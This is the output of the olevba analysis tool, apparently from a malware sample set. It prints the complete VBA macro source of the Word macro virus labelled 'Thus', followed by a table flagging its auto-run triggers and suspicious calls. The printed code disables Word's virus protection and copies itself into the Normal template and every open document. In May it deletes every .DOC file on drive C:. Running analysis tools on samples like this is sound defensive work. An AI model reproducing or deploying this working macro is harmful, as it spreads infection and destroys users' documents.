olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Thus-based-618e12eb919d513e40f93af6833d448b809d057d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Thus-based-618e12eb919d513e40f93af6833d448b809d057d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
'kariba'
    On Error Resume Next
    Application.Options.VirusProtection = False
    If NormalTemplate.VBProject.VBComponents.Item(1).codemodule.Lines(2, 1) <> "'kariba'" Then
    NormalTemplate.VBProject.VBComponents.Item(1).codemodule _
    .deletelines 1, NormalTemplate.VBProject.VBComponents.Item(1) _
    .codemodule.CountOfLines
    End If
    If NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines = 0 Then
    NormalTemplate.VBProject.VBComponents.Item(1).codemodule _
    .InsertLines 1, ActiveDocument.VBProject.VBComponents.Item(1) _
    .codemodule.Lines(1, ActiveDocument.VBProject.VBComponents _
    .Item(1).codemodule.CountOfLines)
    End If
    If NormalTemplate.Saved = False Then NormalTemplate.Save
    For k = 1 To Application.Documents.Count
    If Application.Documents.Item(k).VBProject.VBComponents.Item(1).codemodule.Lines(2, 1) <> "'kariba'" Then
    Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
    .codemodule.deletelines 1, Application.Documents.Item(k) _
    .VBProject.VBComponents.Item(1).codemodule.CountOfLines
    End If
    If Application.Documents.Item(k).VBProject.VBComponents.Item(1).codemodule.CountOfLines = 0 Then
    Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
    .codemodule.InsertLines 1, NormalTemplate.VBProject.VBComponents _
    .Item(1).codemodule.Lines(1, NormalTemplate.VBProject _
    .VBComponents.Item(1).codemodule.CountOfLines)
    End If
    Next k
    If (Month(Now()) = 5) And (VBA.DateTime.Hour(13)) Then
    With Application.FileSearch
        .NewSearch
        .LookIn = "C:\"
        .SearchSubFolders = True
        .FileName = "*.DOC"
        .MatchTextExactly = False
        .FileType = msoFileTypeAllFiles
        If .Execute > 0 Then
        For i = 1 To .FoundFiles.Count
        Kill .FoundFiles(i)
        Next i
        End If
    End With
    End If
End Sub
Private Sub Document_Close()
    Document_Open
End Sub
Private Sub Document_New()
    Document_Open
End Sub
































































































+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

